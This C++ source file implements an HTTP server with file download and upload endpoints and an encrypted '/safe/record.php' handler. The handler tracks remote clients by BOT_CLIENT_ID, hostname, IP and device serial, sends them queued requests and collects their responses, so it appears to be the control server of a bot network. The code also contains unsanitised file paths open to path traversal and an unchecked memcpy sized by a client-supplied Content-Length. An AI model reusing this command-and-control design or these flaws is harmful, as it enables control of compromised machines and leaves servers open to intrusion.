#include "StdAfx.h"
#include "EventHttpFileServer.h"
#include "SafeDiskManager.h"
#include "../Public/Conv.h"
#include "../Defines.h"

#define NOT_FOUND_PAGE "<html><head><title>File not found</title></head><body>File not found</body></html>"
#define FORBIDDEN_PAGE "<html><head><title>Forbidden</title></head><body>Forbidden</body></html>"

#define GET_REQUEST_VALUE(_x, _key)	_x.find(_key) != _x.end() ? _x.find(_key)->second : _T("")

//////////////////////////////////////////////////////////////////////////
//
// File Download
//
//////////////////////////////////////////////////////////////////////////

static ssize_t DownloadFileReaderCallback(void *cls, uint64_t pos, char *buf, size_t max)
{
	FILE *pFile = (FILE *)cls;
	(void)fseek(pFile, (DWORD)pos, SEEK_SET);
	return fread(buf, 1, max, pFile);
}

static void DownloadFileFreeCallback(void *cls)
{
	FILE *pFile = (FILE *)cls;
	fclose(pFile);
}

//////////////////////////////////////////////////////////////////////////
//
// File Upload
//
//////////////////////////////////////////////////////////////////////////

#define POSTBUFFERSIZE  512

#define POST_TYPE_FILE	1
#define POST_TYPE_DATA	2

struct POST_FILE_PARAM
{
	BYTE uType;
	struct MHD_PostProcessor *pPostProcessor;
	FILE *fp;
	const char *szAnswerString;
	int iAnswerCode;
};

//const char *askpage = "<html><body>\n\
//					  Upload a file, please!<br>\n\
//					  There are %u clients uploading at the moment.<br>\n\
//					  <form action=\"/filepost\" method=\"post\" enctype=\"multipart/form-data\">\n\
//					  <input name=\"file\" type=\"file\">\n\
//					  <input type=\"submit\" value=\" Send \"></form>\n\
//					  </body></html>";
const char *UPLOAD_COMPLETE_PAGE = "<html><body>The upload has been completed.</body></html>";
const char *UPLOAD_ERROR_PAGE = "<html><body>This doesn't seem to be right.</body></html>";
const char *UPLOAD_SERVER_ERROR_PAGE = "<html><body>An internal server error has occured.</body></html>";
const char *UPLOAD_FILE_EXIST_PAGE = "<html><body>This file already exists.</body></html>";

static int PostSendPage(struct MHD_Connection *connection, const char *page, int status_code)
{
	int ret;
	struct MHD_Response *response;
	response = MHD_create_response_from_buffer (strlen (page), (void *)page, MHD_RESPMEM_MUST_COPY);
	if (!response)
	{
		return MHD_NO;
	}
	MHD_add_response_header (response, MHD_HTTP_HEADER_CONTENT_TYPE, "text/html");
	ret = MHD_queue_response (connection, status_code, response);
	MHD_destroy_response (response);
	return ret;
}


static int
PostIterate(
	void *coninfo_cls, enum MHD_ValueKind kind, const char *key,
	const char *filename, const char *content_type,
	const char *transfer_encoding, const char *data, uint64_t off,
	size_t size)
{
	struct POST_FILE_PARAM *con_info = (struct POST_FILE_PARAM *)coninfo_cls;
	FILE *fp;

	con_info->szAnswerString = UPLOAD_SERVER_ERROR_PAGE;
	con_info->iAnswerCode = MHD_HTTP_INTERNAL_SERVER_ERROR;

	if (0 != strcmp (key, "up_file_path"))
	{
		return MHD_NO;
	}

	if (!con_info->fp)
	{
		CString strLocalDstDir;
		strLocalDstDir.Format(_T("%sUpload"), theApp.m_strTmpPath);
		BOOL bCreateDirRet = TRUE;
		if (CreateDirectory(strLocalDstDir, NULL) == FALSE)
		{
			DWORD dwError = GetLastError();
			if(dwError != ERROR_FILE_EXISTS && dwError != ERROR_ALREADY_EXISTS)
			{
				bCreateDirRet = FALSE;
			}
		}
		if (!bCreateDirRet)
		{
			return MHD_NO;
		}
		else
		{
			CString strLocalDstPath;
			strLocalDstPath.Format(_T("%s\\%s"), strLocalDstDir, CA2T(filename).m_psz);
			
			if (NULL != (fp = fopen(CT2A(strLocalDstPath).m_psz, "rb")))
			{
				fclose (fp);
				con_info->szAnswerString = UPLOAD_FILE_EXIST_PAGE;
				con_info->iAnswerCode = MHD_HTTP_FORBIDDEN;
				return MHD_NO;
			}

			con_info->fp = fopen(CT2A(strLocalDstPath).m_psz, "ab");
			if (!con_info->fp)
			{
				return MHD_NO;
			}
		}
	}

	if (size > 0)
	{
		if (!fwrite (data, size, sizeof (char), con_info->fp))
		{
			return MHD_NO;
		}
	}

	con_info->szAnswerString = UPLOAD_COMPLETE_PAGE;
	con_info->iAnswerCode = MHD_HTTP_OK;

	return MHD_YES;
}

//////////////////////////////////////////////////////////////////////////
//
// Upload File
//
//////////////////////////////////////////////////////////////////////////

struct POST_DATA_PARAM
{
	BYTE uType;
	int len;
	BYTE *data;
};

static int AnswerToConnection (
	void *cls, struct MHD_Connection *connection,
	const char *url, const char *method,
	const char *version, const char *upload_data,
	size_t *upload_data_size, void **con_cls)
{
//	const char *page = "<html><body>Hello, browser!</body></html>";
//	struct MHD_Response *response = MHD_create_response_from_buffer(strlen (page), (void *) page, MHD_RESPMEM_PERSISTENT);
//	int ret = MHD_queue_response (connection, MHD_HTTP_OK, response);
//	MHD_destroy_response (response);
//	return ret;

	struct MHD_Response *response = NULL;
	if (NULL != strstr(url, "/safe/data/"))
	{
		int ret;
		const char *pName = url + strlen("/safe/data/");
		if ((0 != strcmp(method, MHD_HTTP_METHOD_GET)) && (0 != strcmp(method, MHD_HTTP_METHOD_HEAD)))
			return MHD_NO;
		
		TCHAR szFilePath[MAX_PATH] = {0};
		lstrcpy(szFilePath, theApp.m_strTmpPath);
		lstrcat(szFilePath, _T("Download\\"));
		lstrcat(szFilePath, CA2T(pName).m_psz);
		FILE *pFile = fopen(CT2A(szFilePath).m_psz, "rb");
		if (NULL == pFile)
		{
			response = MHD_create_response_from_buffer(strlen(NOT_FOUND_PAGE), (void *)NOT_FOUND_PAGE, MHD_RESPMEM_PERSISTENT);
			ret = MHD_queue_response(connection, MHD_HTTP_NOT_FOUND, response);
			MHD_destroy_response(response);
		}
		else
		{
			fseek(pFile, 0, SEEK_END);
			DWORD size = ftell(pFile);
			fseek(pFile, 0, SEEK_SET);
			response = MHD_create_response_from_callback(size, 32 * 1024, &DownloadFileReaderCallback, pFile, &DownloadFileFreeCallback);
			if (NULL == response)
			{
				fclose(pFile);
				return MHD_NO;
			}
			ret = MHD_queue_response(connection, MHD_HTTP_OK, response);
			MHD_destroy_response(response);
		}
		return ret;
	}
	else if (NULL != strstr(url, "/safe/upload.php"))
	{
		if (0 != strcmp(method, MHD_HTTP_METHOD_POST))
			return MHD_NO;

		struct POST_FILE_PARAM *pPostParam = (struct POST_FILE_PARAM *)*con_cls;
		if (NULL == pPostParam)
		{
			pPostParam = (struct POST_FILE_PARAM *) malloc (sizeof (struct POST_FILE_PARAM));
			if (NULL == pPostParam)
				return MHD_NO;

			pPostParam->uType = POST_TYPE_FILE;
			pPostParam->fp = NULL;
			pPostParam->pPostProcessor = MHD_create_post_processor(connection, POSTBUFFERSIZE, PostIterate, (void *)pPostParam);
			if (NULL == pPostParam->pPostProcessor)
			{
				free(pPostParam);
				return MHD_NO;
			}

			pPostParam->iAnswerCode = MHD_HTTP_OK;
			pPostParam->szAnswerString = UPLOAD_COMPLETE_PAGE;

			*con_cls = (void *) pPostParam;
			return MHD_YES;
		}

		if (0 != *upload_data_size)
		{
			MHD_post_process (pPostParam->pPostProcessor, upload_data, *upload_data_size);
			*upload_data_size = 0;
			return MHD_YES;
		}
		
		if (NULL != pPostParam->fp)
		{
			fclose(pPostParam->fp);
		}
		
		return PostSendPage(connection, pPostParam->szAnswerString, pPostParam->iAnswerCode);
	}
	else if (NULL != strstr(url, "/safe/record.php"))
	{
		if (0 != strcmp(method, MHD_HTTP_METHOD_POST))
			return MHD_NO;

		const char* param = MHD_lookup_connection_value (connection, MHD_HEADER_KIND, MHD_HTTP_HEADER_CONTENT_LENGTH);
		int content_len = atoi(param);
		POST_DATA_PARAM *pPostParam = (POST_DATA_PARAM *)*con_cls;
		if (NULL == pPostParam)
		{
			pPostParam = (POST_DATA_PARAM *)malloc(sizeof(POST_DATA_PARAM));
			if (NULL == pPostParam)
				return MHD_NO;
			pPostParam->uType = POST_TYPE_DATA;
			pPostParam->len = 0;
			pPostParam->data = (BYTE *)malloc(content_len + 1);
			memset(pPostParam->data, 0, content_len+1);
			*con_cls = (void *)pPostParam;
			return MHD_YES;
		}
		if (*upload_data_size != 0)
		{
			memcpy (pPostParam->data + pPostParam->len, upload_data, *upload_data_size);
			pPostParam->len += (*upload_data_size);
			*upload_data_size = 0;
			return MHD_YES;
		}
		if (NULL == pPostParam->data || content_len != pPostParam->len)
		{
			return MHD_NO;
		}

		char *pszAddr = inet_ntoa(((struct sockaddr_in*)connection->addr)->sin_addr);
		CString strIp = CA2T(pszAddr).m_psz;

		int iBufSize = pPostParam->len;
		LPBYTE post_data = (LPBYTE)pPostParam->data;
		LPBYTE lpData = (LPBYTE)malloc(iBufSize + 2);
		if (NULL == lpData)
		{
			std::string strError = "INTERNAL ERROR(MALLOC FAIL)";
			response = MHD_create_response_from_buffer(strError.size(), (void *)strError.c_str(), MHD_RESPMEM_PERSISTENT);
			int ret = MHD_queue_response(connection, MHD_HTTP_INTERNAL_SERVER_ERROR, response);
			MHD_destroy_response(response);
			return ret;
		}

		MoveMemory(lpData, post_data, iBufSize);
		BinStorage::Decrypt(COMMUNICATION_KEY, lpData, iBufSize);
		lpData[iBufSize] = 0;
		
		std::map<DWORD, CString> mapRequest;
		BinStorage::STORAGE* pResStorage = (BinStorage::STORAGE*)lpData;
		if ((int)pResStorage->size <= iBufSize && BinStorage::CheckHash(pResStorage))
		{
			DWORD dwItemCount = BinStorage::GetItemCount(pResStorage);
			do 
			{
				BinStorage::ITEM *pItem = NULL;
				int iColIndex = 0;
				int iIndex = 0;
				while((pItem = BinStorage::GetNextItem(pResStorage, pItem)) != NULL)
				{
					DWORD dwId = pItem->id;
					LPTSTR pText = BinStorage::GetItemText(pItem);
					std::map<DWORD, CString>::iterator pIter = mapRequest.find(dwId);
					if (pIter == mapRequest.end())
					{
						mapRequest.insert(std::map<DWORD, CString>::value_type(dwId, pText));
					}
					else
					{
						pIter->second = pText;
					}
					delete[] pText;
				}
			}
			while(FALSE);
			SAFE_DELETE(lpData);
		}
		else
		{
			SAFE_DELETE(lpData);
			std::string strError = "INTERNAL ERROR(FORMAT INVALID)";
			response = MHD_create_response_from_buffer(strError.size(), (void *)strError.c_str(), MHD_RESPMEM_PERSISTENT);
			int ret = MHD_queue_response(connection, MHD_HTTP_INTERNAL_SERVER_ERROR, response);
			MHD_destroy_response(response);
			return ret;
		}

		std::map<DWORD, CString>::iterator pIter = mapRequest.find(BOT_REQUEST_TYPE);
		if (pIter == mapRequest.end())
		{
			std::string strError = "INTERNAL ERROR(TYPE INVALID)";
			response = MHD_create_response_from_buffer(strError.size(), (void *)strError.c_str(), MHD_RESPMEM_PERSISTENT);
			int ret = MHD_queue_response(connection, MHD_HTTP_INTERNAL_SERVER_ERROR, response);
			MHD_destroy_response(response);
			return ret;
		}
		DWORD dwType = _tstoi(pIter->second);
		if (REQUEST_TYPE_GET_CLIENT_ID == dwType)
		{
			CString strSerial = GET_REQUEST_VALUE(mapRequest, BOT_DEVICE_SERIAL);
			if (!strSerial.IsEmpty())
			{
				std::string pszSerial = CT2A(strSerial).m_psz;
				BYTE md5[16] = {0};
				Crypt::_md5Hash(md5, (LPVOID)pszSerial.c_str(), pszSerial.size());
				strSerial += _T("__");
				for (int i = 0; i < _countof(md5); i++)
				{
					CString strTmp;
					strTmp.Format(_T("%02x"), md5[i]);
					strSerial += strTmp;
				}
			}

			DWORD dwSerialLen;
			LPSTR pSerial = CConv::CharToUtf(strSerial, &dwSerialLen);
			BinStorage::STORAGE *pResStorage = new BinStorage::STORAGE;
			DWORD dwHash = BinStorage::ElfHash((LPBYTE)pSerial, strlen(pSerial));
			BinStorage::AddItem(&pResStorage, 0, 0, dwHash);
			delete[] pSerial;

			int ret;
			DWORD dwPostDataSize;
			LPBYTE pPostData = BinStorage::Pack(pResStorage, dwPostDataSize);
			if (NULL != pPostData)
			{
				response = MHD_create_response_from_buffer(dwPostDataSize, pPostData, MHD_RESPMEM_MUST_COPY);
				ret = MHD_queue_response(connection, MHD_HTTP_OK, response);
				MHD_destroy_response(response);
				delete[] pPostData;
			}
			else
			{
				std::string strError = "INTERNAL ERROR(COMMUNICATE FAIL)";
				response = MHD_create_response_from_buffer(strError.size(), (void *)strError.c_str(), MHD_RESPMEM_PERSISTENT);
				ret = MHD_queue_response(connection, MHD_HTTP_INTERNAL_SERVER_ERROR, response);
				MHD_destroy_response(response);
			}
			SAFE_DELETE(pResStorage);
			return ret;
		}
		else if (REQUEST_TYPE_GET_FILE_UPDOWN_INFO == dwType)
		{
			BinStorage::STORAGE *pResStorage = new BinStorage::STORAGE;
			BinStorage::AddItem(&pResStorage, 0, 0, TRUE);
			std::string strUploadScript = "/safe/upload.php";
			BinStorage::AddItem(&pResStorage, 0, 0, (LPVOID)strUploadScript.c_str(), strUploadScript.size());
			std::string strUploadDir = "/safe/data/";
			BinStorage::AddItem(&pResStorage, 0, 0, (LPVOID)strUploadDir.c_str(), strUploadDir.size());

			int ret;
			DWORD dwPostDataSize;
			LPBYTE pPostData = BinStorage::Pack(pResStorage, dwPostDataSize);
			if (NULL != pPostData)
			{
				response = MHD_create_response_from_buffer(dwPostDataSize, pPostData, MHD_RESPMEM_MUST_COPY);
				ret = MHD_queue_response(connection, MHD_HTTP_OK, response);
				MHD_destroy_response(response);
				delete[] pPostData;
			}
			else
			{
				std::string strError = "INTERNAL ERROR(COMMUNICATE FAIL)";
				response = MHD_create_response_from_buffer(strError.size(), (void *)strError.c_str(), MHD_RESPMEM_PERSISTENT);
				ret = MHD_queue_response(connection, MHD_HTTP_INTERNAL_SERVER_ERROR, response);
				MHD_destroy_response(response);
			}
			SAFE_DELETE(pResStorage);
			return ret;
		}
		else if (REQUEST_TYPE_CLIENT_REQUEST == dwType)
		{
			// Client Id
			CString strClientId = GET_REQUEST_VALUE(mapRequest, BOT_CLIENT_ID);
			DWORD dwClientId = _tstoi(strClientId);
			// Ip In
			CString strIpIn = GET_REQUEST_VALUE(mapRequest, BOT_IP_IN);
			// Hostname
			CString strHostname = GET_REQUEST_VALUE(mapRequest, BOT_HOSTNAME);
			// Device Seiral
			CString strDeviceSeiral = GET_REQUEST_VALUE(mapRequest, BOT_DEVICE_SERIAL);
			// Comment
			CString strCommentFull = GET_REQUEST_VALUE(mapRequest, BOT_COMMENT);
			LPSTR pCommentFull = CConv::CharToUtf(strCommentFull);
			std::string strSign;
			CString strComment;
			BOOL bLockState = FALSE;
			Json::Reader reader;
			Json::Value root;
			if (strCommentFull.GetLength() > 0 && strCommentFull[0] == _T('{') && reader.parse(pCommentFull, root, false))
			{
				strSign = GET_JSON_STRING(root, "CONFIG_SIGN", "");
				std::string strCommentA = GET_JSON_STRING(root, "COMMENT", "");
				LPTSTR pszComment = CConv::UtfToChar(strCommentA.c_str());
				strComment = pszComment;
				delete[] pszComment;
				bLockState = GetJsonInt(root, "LOCK_STATE", FALSE);
			}
			delete[] pCommentFull;

			// Version
			CString strVersion = GET_REQUEST_VALUE(mapRequest, BOT_VERSION);
			DWORD dwVersion = _tstoi(strVersion);

			// Update Status
			theProtoManager->HttpdUpdateStatus(dwClientId, strIpIn, strIp, strHostname, strDeviceSeiral, strComment, strSign, bLockState, dwVersion);

			// Get Request
			int ret = MHD_NO;
			BOOL bOK = FALSE;
			BinStorage::STORAGE *pResStorage = theProtoManager->HttpdProcessRequest(dwClientId);
			if (NULL != pResStorage)
			{
				DWORD dwPostDataSize;
				LPBYTE pPostData = BinStorage::Pack(pResStorage, dwPostDataSize);
				if (NULL != pPostData)
				{
					response = MHD_create_response_from_buffer(dwPostDataSize, pPostData, MHD_RESPMEM_MUST_COPY);
					ret = MHD_queue_response(connection, MHD_HTTP_OK, response);
					MHD_destroy_response(response);
					delete[] pPostData;
					bOK = TRUE;
				}
			}

			if (!bOK)
			{
				std::string strError = "INTERNAL ERROR(COMMUNICATE FAIL)";
				response = MHD_create_response_from_buffer(strError.size(), (void *)strError.c_str(), MHD_RESPMEM_PERSISTENT);
				ret = MHD_queue_response(connection, MHD_HTTP_INTERNAL_SERVER_ERROR, response);
				MHD_destroy_response(response);
			}
			SAFE_DELETE(pResStorage);
			return ret;
		}
		else if (REQUEST_TYPE_CLIENT_RESULT == dwType)
		{
			CString strEventId = GET_REQUEST_VALUE(mapRequest, BOT_EVENT_ID);
			DWORD dwEventId = _tstoi(strEventId);
			CString strClientId = GET_REQUEST_VALUE(mapRequest, BOT_CLIENT_ID);
			DWORD dwClientId = _tstoi(strClientId);
			CString strResponse = GET_REQUEST_VALUE(mapRequest, BOT_RESPONSE);
			CString strResponseRet = GET_REQUEST_VALUE(mapRequest, BOT_RESPONSE_RET);
			INT iResponseRet = _tstoi(strResponseRet);

			int ret = MHD_NO;
			BOOL bOK = FALSE;
			BinStorage::STORAGE *pResStorage = theProtoManager->HttpdProcessResponse(dwEventId, dwClientId, strResponse, iResponseRet);
			if (NULL != pResStorage)
			{
				DWORD dwPostDataSize;
				LPBYTE pPostData = BinStorage::Pack(pResStorage, dwPostDataSize);
				if (NULL != pPostData)
				{
					response = MHD_create_response_from_buffer(dwPostDataSize, pPostData, MHD_RESPMEM_MUST_COPY);
					ret = MHD_queue_response(connection, MHD_HTTP_OK, response);
					MHD_destroy_response(response);
					delete[] pPostData;
					bOK = TRUE;
				}
			}

			if (!bOK)
			{
				std::string strError = "INTERNAL ERROR(COMMUNICATE FAIL)";
				response = MHD_create_response_from_buffer(strError.size(), (void *)strError.c_str(), MHD_RESPMEM_PERSISTENT);
				ret = MHD_queue_response(connection, MHD_HTTP_INTERNAL_SERVER_ERROR, response);
				MHD_destroy_response(response);
			}
			SAFE_DELETE(pResStorage);
			return ret;
		}
		else if (REQUEST_TYPE_CLIENT_RESULT_ASYNC == dwType)
		{
			CString strClientId = GET_REQUEST_VALUE(mapRequest, BOT_CLIENT_ID);
			DWORD dwClientId = _tstoi(strClientId);
			CString strType = GET_REQUEST_VALUE(mapRequest, BOT_TYPE);
			DWORD dwType = _tstoi(strType);
			CString strResponse = GET_REQUEST_VALUE(mapRequest, BOT_RESPONSE);

			int ret = MHD_NO;
			BOOL bOK = FALSE;
			BinStorage::STORAGE *pResStorage = theProtoManager->HttpdProcessResponseAsync(dwClientId, dwType, strResponse);
			if (NULL != pResStorage)
			{
				DWORD dwPostDataSize;
				LPBYTE pPostData = BinStorage::Pack(pResStorage, dwPostDataSize);
				if (NULL != pPostData)
				{
					response = MHD_create_response_from_buffer(dwPostDataSize, pPostData, MHD_RESPMEM_MUST_COPY);
					ret = MHD_queue_response(connection, MHD_HTTP_OK, response);
					MHD_destroy_response(response);
					delete[] pPostData;
					bOK = TRUE;
				}
			}

			if (!bOK)
			{
				std::string strError = "INTERNAL ERROR(COMMUNICATE FAIL)";
				response = MHD_create_response_from_buffer(strError.size(), (void *)strError.c_str(), MHD_RESPMEM_PERSISTENT);
				ret = MHD_queue_response(connection, MHD_HTTP_INTERNAL_SERVER_ERROR, response);
				MHD_destroy_response(response);
			}
			SAFE_DELETE(pResStorage);
			return ret;
		}

		return MHD_NO;
	}
	else
	{
		response = MHD_create_response_from_buffer(strlen(NOT_FOUND_PAGE), (void *)NOT_FOUND_PAGE, MHD_RESPMEM_PERSISTENT);
		int ret = MHD_queue_response(connection, MHD_HTTP_NOT_FOUND, response);
		MHD_destroy_response(response);
		return ret;
	}
}

static void RequestCompletedCallback(void *cls, struct MHD_Connection *connection, void **con_cls, enum MHD_RequestTerminationCode toe)
{
	BYTE *pType = (BYTE *)*con_cls;
	if (NULL == pType)
	{
		return;
	}

	if (POST_TYPE_FILE == *pType)
	{
		struct POST_FILE_PARAM *con_info = (struct POST_FILE_PARAM *)*con_cls;
		if (NULL == con_info)
			return;

		if (NULL != con_info->pPostProcessor)
		{
			MHD_destroy_post_processor(con_info->pPostProcessor);
		}

		if (con_info->fp)
			fclose(con_info->fp);

		free(con_info);
		*con_cls = NULL;
	}
	if (POST_TYPE_DATA == *pType)
	{
		struct POST_DATA_PARAM *pParam = (struct POST_DATA_PARAM *)*con_cls;
		if (NULL == pParam)
			return;
		SAFE_FREE(pParam->data);
		SAFE_FREE(pParam);
		*con_cls = NULL;
	}
}

CEventHttpFileServer::CEventHttpFileServer(void)
{
	m_daemon = NULL;
}

CEventHttpFileServer::~CEventHttpFileServer(void)
{
	UnBind();
}

BOOL CEventHttpFileServer::Bind(USHORT uPort)
{
	m_daemon = MHD_start_daemon(
		MHD_USE_SELECT_INTERNALLY, uPort, NULL, NULL,
		&AnswerToConnection, NULL,
		MHD_OPTION_CONNECTION_TIMEOUT, (unsigned int) 15,
		MHD_OPTION_NOTIFY_COMPLETED, &RequestCompletedCallback,
		NULL, MHD_OPTION_END
		);
	if (NULL == m_daemon)
	{
		return FALSE;
	}

	return TRUE;
}

VOID CEventHttpFileServer::UnBind()
{
	if (NULL != m_daemon)
	{
		MHD_stop_daemon(m_daemon);
		m_daemon = NULL;
	}
}
